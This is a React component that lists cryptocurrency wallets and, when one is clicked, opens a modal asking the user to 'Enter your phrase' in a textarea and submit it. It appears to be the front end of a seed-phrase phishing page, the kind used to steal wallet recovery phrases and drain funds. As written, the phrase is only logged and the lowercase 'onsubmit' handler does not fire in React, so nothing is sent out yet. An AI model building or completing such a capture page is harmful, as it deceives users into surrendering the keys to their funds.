import React, { useState } from 'react';
import { cryptoData } from '@/components/data';

function coin() {
  const [details, setDetails] = useState('');
  const [display, setDisplay] = useState(null);
  const [openModal, setOpenModal] = useState(false);
  const handleSubmit = () => {
    console.log(details);
  };

  const handleOpen = (data) => {
    setDisplay(data);
    setOpenModal(true);
  };

  return (
    <div className='w-full h-screen flex justify-center items-center'>
      <div className='flex flex-col p-4 rounded-md border-4 shadow-md bg-white space-y-3 w-[40%] h-[70vh] overflow-auto'>
        {cryptoData?.map((data) => (
          <div
            className='flex items-center space-x-3 text-black py-2 px-2 bg-gray-100 cursor-pointer hover:bg-[#001132] hover:text-white transition-all ease-in-out duration-500'
            onClick={() => handleOpen(data)}
          >
            <div style={{ color: data.color ? data.color : 'blue' }}>
              {data.icon}
            </div>
            <h1 className=''>{data.name}</h1>
          </div>
        ))}
      </div>
      {openModal && (
        <div className='absolute top-0 right-0 left-0 bottom-0 flex justify-center items-center'>
          <div className='absolute top-0 right-0 left-0 bottom-0 bg-black opacity-40'></div>
          <div className='w-[30%] text-black bg-white z-40 p-5 rounded-md'>
            <div className='mb-4 flex items-center space-x-3'>
              <div style={{ color: display.color ? display.color : 'blue' }}>
                {display.icon}
              </div>
              <h1 className=''>{display.name}</h1>
            </div>
            <form method='POST' onsubmit={handleSubmit}>
              <label>Enter your phrase</label>
              <textarea
                rows={4}
                className='rounded-md border border-gray-500 p-3 mt-4 w-full'
                onChange={(e) => setDetails(e.target.value)}
              ></textarea>
              <button
                type='submit'
                className='w-full py-2 rounded-md bg-[#001132] mt-4 text-white hover:opacity-70'
              >
                Submit
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}

export default coin;
